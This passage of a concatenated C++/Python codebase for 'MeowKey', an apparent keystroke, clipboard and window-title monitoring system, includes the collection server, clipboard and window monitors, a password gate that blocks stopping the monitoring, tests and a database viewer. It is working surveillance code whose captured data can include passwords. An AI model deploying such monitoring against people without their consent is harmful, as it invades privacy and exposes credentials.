                size_t start = client_id.find_first_not_of(" \t\r\n");
                size_t end = client_id.find_last_not_of(" \t\r\n");
                if (start != string::npos)
                {
                    client_id = client_id.substr(start, end - start + 1);
                }
            }
            else
            {
                client_id = handshake;
            }

            if (client_id.empty())
            {
#ifdef _WIN32
                closesocket(client_sock);
#else
                close(client_sock);
#endif
                continue;
            }

            handleNewConnection(client_sock, client_id);
        }
    }

    void handleNewConnection(int sock, const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        if (pending_clients_.count(client_id) || active_clients_.count(client_id))
        {
            cout << "âŒ Client " << client_id << " already connected" << endl;
            string msg = "ERROR: Already connected\n";
            send(sock, msg.c_str(), msg.size(), 0);
#ifdef _WIN32
            closesocket(sock);
#else
            close(sock);
#endif
            return;
        }

        cout << "\nðŸ”” NEW CONNECTION REQUEST" << endl;
        cout << "   Client ID: " << client_id << endl;
        cout << "   Action: accept " << client_id << " | reject " << client_id << endl;
        cout << string(40, '-') << endl;

        pending_clients_[client_id] = make_unique<ClientHandler>(sock, client_id, db_);
    }

    void acceptClient(const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        auto it = pending_clients_.find(client_id);
        if (it == pending_clients_.end())
        {
            cout << "âŒ Client not in pending list: " << client_id << endl;
            return;
        }

        auto handler = move(it->second);
        pending_clients_.erase(it);

        // Register client in database
        ClientRecord record;
        bool existing = db_->registerClient(client_id, record);

        // Send approval
        string msg = "APPROVED\n";
        send(handler->getSocket(), msg.c_str(), msg.size(), 0);

        // Start handler
        handler->start();
        active_clients_[client_id] = move(handler);

        cout << "âœ… Client accepted: " << client_id << endl;
    }

    void rejectClient(const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        auto it = pending_clients_.find(client_id);
        if (it == pending_clients_.end())
        {
            cout << "âŒ Client not in pending list: " << client_id << endl;
            return;
        }

        string msg = "REJECTED\n";
        send(it->second->getSocket(), msg.c_str(), msg.size(), 0);
        it->second->stop();
        pending_clients_.erase(it);

        cout << "âŒ Client rejected: " << client_id << endl;
    }

    void kickClient(const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        auto it = active_clients_.find(client_id);
        if (it != active_clients_.end())
        {
            it->second->stop();
            active_clients_.erase(it);
            cout << "âœ… Client kicked: " << client_id << endl;
            return;
        }

        it = pending_clients_.find(client_id);
        if (it != pending_clients_.end())
        {
            it->second->stop();
            pending_clients_.erase(it);
            cout << "âœ… Pending client removed: " << client_id << endl;
            return;
        }

        cout << "âŒ Client not found: " << client_id << endl;
    }

    void listClients()
    {
        lock_guard<mutex> lock(clients_mutex_);

        stringstream output;

        output << "\nPENDING (" << pending_clients_.size() << "):" << endl;
        if (pending_clients_.empty())
            output << "  (none)" << endl;
        else
            for (auto &p : pending_clients_)
                output << "  " << p.first << endl;

        output << "\nACTIVE (" << active_clients_.size() << "):" << endl;
        if (active_clients_.empty())
            output << "  (none)" << endl;
        else
            for (auto &p : active_clients_)
                output << "  " << p.first << endl;

        // Capture output if called from API
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << output.str();
        }
        else
        {
            cout << output.str();
        }
    }

    void showAllClients()
    {
        auto clients = db_->getAllClients();
        stringstream output;

        output << "\nALL REGISTERED CLIENTS IN DATABASE:" << endl;
        if (clients.empty())
        {
            output << "  (no clients)" << endl;
        }
        else
        {
            for (auto &id : clients)
            {
                ClientRecord rec;
                if (db_->getClientStats(id, rec))
                {
                    output << "  * " << id << " | Sessions: " << rec.session_count
                           << " KS:" << rec.total_keystrokes
                           << " CB:" << rec.total_clipboard
                           << " W:" << rec.total_windows << endl;
                }
            }
        }

        // Capture output if called from API
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << output.str();
        }
        else
        {
            cout << output.str();
        }
    }


void viewClientData(const string &client_id, const string &type)
{
    QueryResult result;
    if (!db_->queryClientAllEvents(client_id, result))
    {
        string msg = "âŒ Failed to query client: " + client_id;
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << msg << endl;
        }
        else
        {
            cout << msg << endl;
        }
        return;
    }

    stringstream output;
    output << "\nDATA FOR CLIENT: " << client_id << endl;

    if (type == "all" || type == "ks")
    {
        output << "\nKEYSTROKES (" << result.keystrokes.size() << "):" << endl;
        for (size_t i = 0; i < result.keystrokes.size(); ++i)
        {
            output << "  " << (i + 1) << ". [" << result.keystrokes[i].timestamp
                   << "] " << result.keystrokes[i].key << endl;
        }
    }

    if (type == "all" || type == "clip")
    {
        output << "\nCLIPBOARD (" << result.clipboard_events.size() << "):" << endl;
        for (size_t i = 0; i < result.clipboard_events.size(); ++i)
        {
            // **FIX: Add null pointer check**
            if (result.clipboard_events[i].content == nullptr || 
                result.clipboard_events[i].content_length == 0)
            {
                output << "  " << (i + 1) << ". [" << result.clipboard_events[i].timestamp
                       << "] (empty)" << endl;
                continue;
            }
            
            // **FIX: Use safe string construction**
            string content;
            try {
                content = string(result.clipboard_events[i].content,
                               result.clipboard_events[i].content_length);
            } catch (...) {
                content = "(invalid data)";
            }
            
            output << "  " << (i + 1) << ". [" << result.clipboard_events[i].timestamp
                   << "] " << content.substr(0, 50);
            if (content.size() > 50)
                output << "...";
            output << endl;
        }
    }

    if (type == "all" || type == "win")
    {
        output << "\nWINDOWS (" << result.window_events.size() << "):" << endl;
        for (size_t i = 0; i < result.window_events.size(); ++i)
        {
            output << "  " << (i + 1) << ". [" << result.window_events[i].timestamp
                   << "] " << result.window_events[i].title
                   << " [" << result.window_events[i].process << "]" << endl;
        }
    }

    // Capture output if called from API
    if (!current_cmd_id_.empty())
    {
        lock_guard<mutex> lock(output_mutex_);
        command_output_ << output.str();
    }
    else
    {
        cout << output.str();
    }
}

void deleteClient(const string &client_id)
{
    // First, try to disconnect if they're currently connected
    {
        lock_guard<mutex> lock(clients_mutex_);
        
        auto it = active_clients_.find(client_id);
        if (it != active_clients_.end())
        {
            cout << "ðŸ”Œ Disconnecting active client: " << client_id << endl;
            it->second->stop();
            active_clients_.erase(it);
        }
        
        auto pit = pending_clients_.find(client_id);
        if (pit != pending_clients_.end())
        {
            cout << "ðŸ”Œ Removing pending client: " << client_id << endl;
            pit->second->stop();
            pending_clients_.erase(pit);
        }
    }
    
    // Now delete from database (whether they were connected or not)
    if (db_->deleteClient(client_id))
    {
        cout << "âœ… Client deleted from database: " << client_id << endl;
    }
    else
    {
        cout << "âŒ Database deletion failed: " << client_id << endl;
    }
}


    // void deleteClient(const string &client_id)
    // {
    //     kickClient(client_id);
    //     if (db_->deleteClient(client_id))
    //     {
    //         cout << "âœ… Client deleted: " << client_id << endl;
    //     }
    //     else
    //     {
    //         cout << "âŒ Delete failed: " << client_id << endl;
    //     }
    // }
};

#endif

===== FILE: ./test_api.cpp =====

// test_api.cpp - Test C++ API server
#include <iostream>
#include <string>
#include <cstring>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>

using namespace std;

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        cerr << "Socket creation failed" << endl;
        return 1;
    }
    
    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(3002);
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        cerr << "Connection failed" << endl;
        close(sock);
        return 1;
    }
    
    // Test ping
    string ping_json = "{\"command\":\"ping\"}\n";
    cout << "Sending: " << ping_json;
    send(sock, ping_json.c_str(), ping_json.size(), 0);
    
    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));
    recv(sock, buffer, sizeof(buffer) - 1, 0);
    cout << "Received: " << buffer << endl;
    
    // Test list
    string list_json = "{\"command\":\"list\"}\n";
    cout << "Sending: " << list_json;
    send(sock, list_json.c_str(), list_json.size(), 0);
    
    memset(buffer, 0, sizeof(buffer));
    recv(sock, buffer, sizeof(buffer) - 1, 0);
    cout << "Received: " << buffer << endl;
    
    close(sock);
    return 0;
}

===== FILE: ./test_database.cpp =====

#include "meowkey_database.hpp"
#include "event_buffers.hpp"
#include <iostream>
#include <vector>
#include <chrono>
#include <thread>
#include <memory>

using namespace std;

uint64_t getTimestamp() {
    return chrono::duration_cast<chrono::microseconds>(
        chrono::system_clock::now().time_since_epoch()
    ).count();
}

void testBasicOperations() {
    cout << "\n=== TEST 1: Basic Database Operations ===" << endl;
    
    MeowKeyDatabase db("test_meowkey.db");
    if (!db.open()) {
        cerr << "Failed to open database" << endl;
        return;
    }
    
    // Register clients
    ClientRecord client1, client2, client3;
    
    cout << "\nRegistering clients..." << endl;
    db.registerClient("bscs24009", client1);
    db.registerClient("bscs24010", client2);
    db.registerClient("bscs24011", client3);
    
    db.printStats();
    db.close();
    cout << "âœ“ Test 1 passed" << endl;
}

void testBufferOperations() {
    cout << "\n=== TEST 2: Buffer Operations ===" << endl;
    
    MeowKeyDatabase db("test_meowkey.db");
    if (!db.open()) {
        cerr << "Failed to open database" << endl;
        return;
    }
    
    // First, register the client
    ClientRecord record;
    db.registerClient("bscs24009", record);
    
    // Create client session
    ClientSession session("bscs24009", &db);
    
    cout << "\nTesting buffer operations..." << endl;
    
    // Test 1: Add 24 keystrokes (should NOT auto-flush)
    cout << "1. Adding 24 keystrokes (below flush threshold)..." << endl;
    for (int i = 0; i < 24; i++) {
        session.addKeystroke(getTimestamp(), "KEY_" + to_string(i));
    }
    session.printBufferStatus();
    
    // Test 2: Add 1 more to trigger auto-flush (25 total)
    cout << "\n2. Adding 1 more keystroke to trigger auto-flush..." << endl;
    session.addKeystroke(getTimestamp(), "TRIGGER");
    session.printBufferStatus();
    
    // Test 3: Add 5 more (should have 5 in buffer after flush)
    cout << "\n3. Adding 5 more keystrokes..." << endl;
    for (int i = 0; i < 5; i++) {
        session.addKeystroke(getTimestamp(), "POST_" + to_string(i));
    }
    session.printBufferStatus();
    
    // Test 4: Manual flush
    cout << "\n4. Manual flush of remaining..." << endl;
    session.flushAll();
    session.printBufferStatus();
    
    // Test clipboard
    cout << "\n5. Testing clipboard buffer..." << endl;
    for (int i = 0; i < 4; i++) {
        session.addClipboard(getTimestamp(), "Clip " + to_string(i));
    }
    session.printBufferStatus();
    session.flushAll();
    
    // Test window
    cout << "\n6. Testing window buffer..." << endl;
    for (int i = 0; i < 7; i++) {
        session.addWindow(getTimestamp(), "Win " + to_string(i), "app.exe");
    }
    session.printBufferStatus();
    session.flushAll();
    
    db.printStats();
    db.close();
    
    cout << "âœ“ Test 2 passed" << endl;
}

void testMultipleClients() {
    cout << "\n=== TEST 3: Multiple Clients ===" << endl;
    
    MeowKeyDatabase db("test_meowkey.db");
    if (!db.open()) {
        cerr << "Failed to open database" << endl;
        return;
    }
    
    vector<unique_ptr<ClientSession>> sessions;
    
    // Create 3 clients
    for (int i = 0; i < 3; i++) {
        string client_id = "multi_client_" + to_string(i);
        ClientRecord rec;
        db.registerClient(client_id, rec);
        sessions.push_back(make_unique<ClientSession>(client_id, &db));
    }
    
    cout << "\nSimulating activity..." << endl;
    
    // Each client generates events
    for (int i = 0; i < sessions.size(); i++) {
        for (int j = 0; j < 10; j++) {
            sessions[i]->addKeystroke(getTimestamp(), "Key_" + to_string(j));
        }
        sessions[i]->addClipboard(getTimestamp(), "Shared text");
        sessions[i]->addWindow(getTimestamp(), "Browser", "chrome.exe");
    }
    
    cout << "\nBuffer status:" << endl;
    for (auto& session : sessions) {
        session->printBufferStatus();
    }
    
    cout << "\nFlushing all..." << endl;
    for (auto& session : sessions) {
        session->flushAll();
    }
    
    db.printStats();
    db.close();
    
    cout << "âœ“ Test 3 passed" << endl;
}

void testReloadExistingClient() {
    cout << "\n=== TEST 4: Reload Existing Client ===" << endl;
    
    MeowKeyDatabase db("test_meowkey.db");
    if (!db.open()) {
        cerr << "Failed to open database" << endl;
        return;
    }
    
    // Try to reload bscs24009
    ClientRecord record;
    if (db.registerClient("bscs24009", record)) {
        cout << "\nâœ“ Loaded existing client: bscs24009" << endl;
        cout << "  Sessions: " << record.session_count << endl;
        cout << "  Total keystrokes: " << record.total_keystrokes << endl;
        cout << "  Total clipboard: " << record.total_clipboard << endl;
        cout << "  Total windows: " << record.total_windows << endl;
    }
    
    // Add more data
    ClientSession session("bscs24009", &db);
    for (int i = 0; i < 5; i++) {
        session.addKeystroke(getTimestamp(), "RELOAD_" + to_string(i));
    }
    session.flushAll();
    
    // Check updated stats
    if (db.getClientStats("bscs24009", record)) {
        cout << "\nâœ“ Updated stats:" << endl;
        cout << "  Sessions: " << record.session_count << endl;
        cout << "  Total keystrokes: " << record.total_keystrokes << endl;
    }
    
    db.printStats();
    db.close();
    
    cout << "âœ“ Test 4 passed" << endl;
}

void testClientDeletion() {
    cout << "\n=== TEST 5: Client Deletion ===" << endl;
    
    MeowKeyDatabase db("test_meowkey.db");
    if (!db.open()) {
        cerr << "Failed to open database" << endl;
        return;
    }
    
    cout << "\nBefore deletion:" << endl;
    db.printStats();
    
    // Create and delete a test client
    ClientRecord test_rec;
    db.registerClient("temp_client", test_rec);
    
    // Delete it
    if (db.deleteClient("temp_client")) {
        cout << "\nâœ“ Client deleted successfully" << endl;
    }
    
    cout << "\nAfter deletion:" << endl;
    db.printStats();
    
    // Try to reload deleted client (should create new)
    ClientRecord record;
    if (db.registerClient("temp_client", record)) {
        cout << "\nâœ“ Reloaded temp_client (should be newly created)" << endl;
        cout << "  Sessions: " << record.session_count << endl;
        cout << "  (Should be 1 if newly created)" << endl;
    }
    
    db.close();
    cout << "âœ“ Test 5 passed" << endl;
}

void testStressLoad() {
    cout << "\n=== TEST 6: Stress Test ===" << endl;
    
    MeowKeyDatabase db("test_meowkey.db");
    if (!db.open()) {
        cerr << "Failed to open database" << endl;
        return;
    }
    
    // REGISTER THE CLIENT FIRST!
    ClientRecord stress_record;
    db.registerClient("stress_client", stress_record);
    
    // Now create session
    ClientSession session("stress_client", &db);
    
    cout << "\nGenerating 50 keystrokes..." << endl;
    auto start = chrono::steady_clock::now();
    
    for (int i = 0; i < 50; i++) {
        session.addKeystroke(getTimestamp(), "STRESS_" + to_string(i));
        if ((i + 1) % 10 == 0) {
            cout << "  Generated " << (i + 1) << " keystrokes" << endl;
        }
    }
    session.flushAll();
    
    auto end = chrono::steady_clock::now();
    auto duration = chrono::duration_cast<chrono::milliseconds>(end - start);
    
    cout << "âœ“ Completed in " << duration.count() << " ms" << endl;
    
    ClientRecord record;
    if (db.getClientStats("stress_client", record)) {
        cout << "Total keystrokes saved: " << record.total_keystrokes << endl;
    }
    
    db.printStats();
    db.close();
    
    cout << "âœ“ Test 6 passed" << endl;
}

void testSplitOperations() {
    cout << "\n=== TEST 7: B+ Tree Split Operations ===" << endl;
    
    MeowKeyDatabase db("test_meowkey.db");
    if (!db.open()) {
        cerr << "Failed to open database" << endl;
        return;
    }
    
    // Create a test client specifically for split testing
    ClientRecord split_record;
    db.registerClient("split_test", split_record);
    
    ClientSession session("split_test", &db);
    
    cout << "\nInserting 70 keystrokes (more than BPLUS_ORDER=63) to trigger splits..." << endl;
    
    for (int i = 0; i < 70; i++) {
        session.addKeystroke(getTimestamp(), "SPLIT_KEY_" + to_string(i));
        if ((i + 1) % 10 == 0) {
            cout << "  Inserted " << (i + 1) << " keystrokes" << endl;
        }
    }
    
    // Force flush to trigger any splits
    session.flushAll();
    
    // Check stats
    ClientRecord record;
    if (db.getClientStats("split_test", record)) {
        cout << "\nâœ“ Split test client stats:" << endl;
        cout << "  Total keystrokes: " << record.total_keystrokes << " (should be 70)" << endl;
        cout << "  Tree root offset: " << record.keystroke_tree_root << endl;
    }
    
    db.printStats();
    db.close();
    
    cout << "âœ“ Test 7 passed" << endl;
}

int main() {
    cout << "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
    cout << "â•‘     MeowKey Database Test Suite                  â•‘" << endl;
    cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" << endl;
    
    try {
        testBasicOperations();
        testBufferOperations();
        testMultipleClients();
        testReloadExistingClient();
        testClientDeletion();
        testStressLoad();
        testSplitOperations();
    } catch (const exception& e) {
        cerr << "ERROR: " << e.what() << endl;
        return 1;
    }
    
    cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
    cout << "â•‘     All Tests Completed                           â•‘" << endl;
    cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" << endl;
    
    return 0;
}

===== FILE: ./thread_safe_queue.hpp =====

#ifndef THREAD_SAFE_QUEUE_HPP
#define THREAD_SAFE_QUEUE_HPP

#include <queue>
#include <mutex>
#include <condition_variable>
#include <optional>
using namespace std;

template <typename T>
class ThreadSafeQueue
{
private:
  mutable mutex mutex_;
  queue<T> queue_;
  condition_variable condition_;
  size_t max_size_;

public:
  ThreadSafeQueue(size_t max_size = 1000) : max_size_(max_size) {}

  void push(T value)
  {
    unique_lock<mutex> lock(mutex_);
    if (queue_.size() >= max_size_)
    {
      queue_.pop(); // Remove oldest if queue is full
    }
    queue_.push(move(value));
    condition_.notify_one();
  }

  optional<T> pop()
  {
    unique_lock<mutex> lock(mutex_);
    if (condition_.wait_for(lock, chrono::milliseconds(100),
                            [this]
                            { return !queue_.empty(); }))
    {
      T value = move(queue_.front());
      queue_.pop();
      return value;
    }
    return nullopt;
  }

  bool empty() const
  {
    unique_lock<mutex> lock(mutex_);
    return queue_.empty();
  }

  size_t size() const
  {
    unique_lock<mutex> lock(mutex_);
    return queue_.size();
  }
};

#endif

===== FILE: ./window_monitor_windows.hpp =====

#ifndef WINDOW_MONITOR_WINDOWS_HPP
#define WINDOW_MONITOR_WINDOWS_HPP

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <string>
#include <thread>
#include <atomic>
#include <functional>
#include <iostream>
#include <psapi.h>
using namespace std;
#pragma comment(lib, "psapi.lib")

class WindowMonitorWindows
{
private:
    atomic<bool> monitoring_;
    thread monitor_thread_;
    function<void(const string &)> callback_;
    string last_window_title_;
    static constexpr int CHECK_INTERVAL_MS = 1000;

public:
    WindowMonitorWindows(function<void(const string &)> callback)
        : monitoring_(false), callback_(callback) {}

    ~WindowMonitorWindows()
    {
        stop();
    }

    bool start()
    {
        if (monitoring_)
        {
            return false;
        }

        monitoring_ = true;
        monitor_thread_ = thread(&WindowMonitorWindows::monitorLoop, this);

        cout << "Window monitoring started" << endl;
        return true;
    }

    void stop()
    {
        monitoring_ = false;
        if (monitor_thread_.joinable())
        {
            monitor_thread_.join();
        }
        cout << "Window monitoring stopped" << endl;
    }

    bool isMonitoring() const
    {
        return monitoring_;
    }

private:
    void monitorLoop()
    {
        string initial_window = getActiveWindowTitle();
        if (!initial_window.empty())
        {
            last_window_title_ = initial_window;
            if (callback_)
            {
                callback_("WINDOW: " + initial_window);
            }
        }

        while (monitoring_)
        {
            string current_window = getActiveWindowTitle();

            if (!current_window.empty() && current_window != last_window_title_)
            {
                cout << "Window changed to: " << current_window << endl;

                if (callback_)
                {
                    callback_("WINDOW: " + current_window);
                }

                last_window_title_ = current_window;
            }

            this_thread::sleep_for(chrono::milliseconds(CHECK_INTERVAL_MS));
        }
    }

    string getActiveWindowTitle()
    {
        HWND hwnd = GetForegroundWindow();
        if (hwnd == nullptr)
        {
            return "Unknown Window";
        }

        // Get window title
        wchar_t title[256];
        int len = GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t));

        string window_title;
        if (len > 0)
        {
            int size = WideCharToMultiByte(CP_UTF8, 0, title, -1, nullptr, 0, nullptr, nullptr);
            if (size > 0)
            {
                char *buffer = new char[size];
                WideCharToMultiByte(CP_UTF8, 0, title, -1, buffer, size, nullptr, nullptr);
                window_title = string(buffer);
                delete[] buffer;
            }
        }

        // Get process name
        DWORD processId;
        GetWindowThreadProcessId(hwnd, &processId);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        string process_name;

        if (hProcess)
        {
            wchar_t processPath[MAX_PATH];
            if (GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH))
            {
                // Extract just the filename
                wchar_t *fileName = wcsrchr(processPath, L'\\');
                if (fileName)
                {
                    fileName++;
                    int size = WideCharToMultiByte(CP_UTF8, 0, fileName, -1, nullptr, 0, nullptr, nullptr);
                    if (size > 0)
                    {
                        char *buffer = new char[size];
                        WideCharToMultiByte(CP_UTF8, 0, fileName, -1, buffer, size, nullptr, nullptr);
                        process_name = string(buffer);
                        delete[] buffer;
                    }
                }
            }
            CloseHandle(hProcess);
        }

        string result;
        if (!window_title.empty())
        {
            result = window_title;
            if (!process_name.empty())
            {
                result += " [" + process_name + "]";
            }
        }
        else if (!process_name.empty())
        {
            result = process_name;
        }
        else
        {
            result = "Window " + to_string(reinterpret_cast<uintptr_t>(hwnd));
        }

        return result;
    }
};

#endif // PLATFORM_WINDOWS
#endif

===== FILE: ./password_dialog_linux.hpp =====

#ifndef PASSWORD_DIALOG_LINUX_HPP
#define PASSWORD_DIALOG_LINUX_HPP

#ifdef PLATFORM_LINUX

#include <string>
#include <iostream>
#include <cstdlib>
#include <termios.h>
#include <unistd.h>
#include "launcher_common.hpp"
using namespace std; 
class PasswordDialogLinux {
public:
    static bool showPasswordDialog() {
        // Try zenity first (GUI dialog)
        if (system("which zenity > /dev/null 2>&1") == 0) {
            return showZenityDialog();
        }
        
        // Fallback to terminal prompt
        return showTerminalPrompt();
    }
    
private:
    static bool showZenityDialog() {
          string command = "zenity --password --title=\"Exit Authorization\" "
                             "--text=\"Enter password to stop monitoring:\" 2>/dev/null";
        
        FILE* pipe = popen(command.c_str(), "r");
        if (!pipe) {
            return showTerminalPrompt();
        }
        
        char buffer[256];
          string password;
        if (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            password = buffer;
            // Remove newline
            if (!password.empty() && password[password.length()-1] == '\n') {
                password.erase(password.length()-1);
            }
        }
        
        pclose(pipe);
        return verifyPassword(password);
    }
    
    static bool showTerminalPrompt() {
          cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" <<   endl;
          cout << "â•‘  EXIT AUTHORIZATION REQUIRED          â•‘" <<   endl;
          cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" <<   endl;
          cout << "Enter password to stop monitoring: ";
        
          string password = getPasswordInput();
          cout <<   endl;
        
        return verifyPassword(password);
    }
    
    static   string getPasswordInput() {
          string password;
        
        // Disable echo
        termios oldt;
        tcgetattr(STDIN_FILENO, &oldt);
        termios newt = oldt;
        newt.c_lflag &= ~ECHO;
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
        
        // Read password
          getline(  cin, password);
        
        // Restore echo
        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
        
        return password;
    }
};

#endif // PLATFORM_LINUX
#endif

===== FILE: ./view_db.py =====

# view_db.py - Python script to view your database
import struct
import sys

def read_header(filename):
    with open(filename, 'rb') as f:
        # Read 256 byte header
        data = f.read(256)
        
        # Unpack header (all little-endian)
        magic, version = struct.unpack('<II', data[0:8])
        file_size, client_table = struct.unpack('<QQ', data[8:24])
        keystroke_tree, clipboard_tree = struct.unpack('<QQ', data[24:40])
        window_tree, num_clients = struct.unpack('<QI', data[40:52])
        max_clients, next_free = struct.unpack('<IQ', data[52:64])
        
        print("=== DATABASE HEADER ===")
        print(f"Magic: 0x{magic:08X} ('{chr((magic>>24)&0xFF)}{chr((magic>>16)&0xFF)}{chr((magic>>8)&0xFF)}{chr(magic&0xFF)}')")
        print(f"Version: {version}")
        print(f"File size: {file_size} bytes (0x{file_size:X})")
        print(f"Client table offset: 0x{client_table:X} ({client_table} bytes)")
        print(f"Keystroke tree offset: 0x{keystroke_tree:X}")
        print(f"Clipboard tree offset: 0x{clipboard_tree:X}")
        print(f"Window tree offset: 0x{window_tree:X}")
        print(f"Num clients: {num_clients}")
        print(f"Max clients: {max_clients}")
        print(f"Next free offset: 0x{next_free:X} ({next_free} bytes)")
        
        # Dump first 64 bytes as hex
        print("\n=== HEX DUMP (first 64 bytes) ===")
        for i in range(0, 64, 16):
            hex_part = ' '.join(f'{b:02X}' for b in data[i:i+16])
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data[i:i+16])
            print(f"{i:08X}: {hex_part:47}  {ascii_part}")

def find_client_001(filename):
    print("\n=== SEARCHING FOR CLIENT '001' ===")
    with open(filename, 'rb') as f:
        # Read entire file
        data = f.read()
        
        # Look for '001' in ASCII
        pos = data.find(b'001')
        if pos != -1:
            print(f"Found '001' at offset 0x{pos:X} ({pos} bytes)")
            
            # Show context
            start = max(0, pos - 16)
            end = min(len(data), pos + 32)
            context = data[start:end]
            
            print("Context:")
            for i in range(start, end, 16):
                chunk = data[i:min(i+16, end)]
                hex_str = ' '.join(f'{b:02X}' for b in chunk)
                ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                print(f"{i:08X}: {hex_str:47}  {ascii_str}")

def view_keystrokes(filename):
    print("\n=== KEYSTROKE EVENTS ===")
    # Offsets from your logs
    offsets = [267632, 267696, 267760, 267824, 267888]
    
    with open(filename, 'rb') as f:
        for offset in offsets:
            f.seek(offset)
            # Read KeystrokeEvent (64 bytes)
            data = f.read(64)
            if len(data) == 64:
                # Unpack: timestamp (Q), client_hash (I), sequence (I), key (48s)
                timestamp, client_hash, sequence = struct.unpack('<QII', data[0:16])
                key = data[16:64].split(b'\x00')[0].decode('utf-8', errors='ignore')
                
                print(f"Offset 0x{offset:X}: Key='{key}' | Timestamp={timestamp} | Hash=0x{client_hash:X}")

if __name__ == "__main__":
    filename = "meowkey_server.db"
    read_header(filename)
    find_client_001(filename)
    view_keystrokes(filename)

===== FILE: ./clipboard_monitor_windows.hpp =====

#ifndef CLIPBOARD_MONITOR_WINDOWS_HPP
#define CLIPBOARD_MONITOR_WINDOWS_HPP

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <string>
#include <thread>
#include <atomic>
#include <functional>
#include <iostream>
using namespace std; 
class ClipboardMonitorWindows {
private:
      atomic<bool> monitoring_;
      thread monitor_thread_;
      function<void(const   string&)> callback_;
      string last_clipboard_content_;
    static const size_t MAX_CLIPBOARD_SIZE = 10240;

public:
    ClipboardMonitorWindows(  function<void(const   string&)> callback) 
        : monitoring_(false), callback_(callback) {}

    ~ClipboardMonitorWindows() {
        stop();
    }

    bool start() {
        if (monitoring_) {
            return false;
        }

        monitoring_ = true;
        monitor_thread_ =   thread(&ClipboardMonitorWindows::monitorLoop, this);
        
          cout << "Clipboard monitoring started" <<   endl;
        return true;
    }

    void stop() {
        monitoring_ = false;
        if (monitor_thread_.joinable()) {
            monitor_thread_.join();
        }
          cout << "Clipboard monitoring stopped" <<   endl;
    }

    bool isMonitoring() const {
        return monitoring_;
    }

private:
    void monitorLoop() {
          string initial_content = getClipboardText();
        if (!initial_content.empty()) {
            last_clipboard_content_ = initial_content;
        }

        while (monitoring_) {
              string current_content = getClipboardText();
            
            if (!current_content.empty() && current_content != last_clipboard_content_) {
                  string display_content = current_content;
                if (display_content.length() > 100) {
                    display_content = display_content.substr(0, 100) + "...";
                }
                
                  cout << "Clipboard changed: " << display_content <<   endl;
                
                if (callback_) {
                    if (current_content.length() > MAX_CLIPBOARD_SIZE) {
                          string truncated = current_content.substr(0, MAX_CLIPBOARD_SIZE) + "...[TRUNCATED]";
                        callback_("CLIPBOARD: " + truncated);
                    } else {
                        callback_("CLIPBOARD: " + current_content);
                    }
                }
                
                last_clipboard_content_ = current_content;
            }
            
              this_thread::sleep_for(  chrono::milliseconds(500));
        }
    }

      string getClipboardText() {
        if (!OpenClipboard(nullptr)) {
            return "";
        }

          string result;
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData != nullptr) {
            wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
            if (pszText != nullptr) {
                // Convert wide string to narrow string
                int size = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, nullptr, 0, nullptr, nullptr);
                if (size > 0) {
                    char* buffer = new char[size];
                    WideCharToMultiByte(CP_UTF8, 0, pszText, -1, buffer, size, nullptr, nullptr);
                    result =   string(buffer);
                    delete[] buffer;
                }
                GlobalUnlock(hData);
            }
        }

        CloseClipboard();
        return result;
    }
};

#endif // PLATFORM_WINDOWS
#endif

===== FILE: ./socket_utils_cross.hpp =====

#ifndef SOCKET_UTILS_CROSS_HPP
#define SOCKET_UTILS_CROSS_HPP

#include "platform_detector.hpp"

#ifdef PLATFORM_WINDOWS
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

#include <string>
#include <cstring>
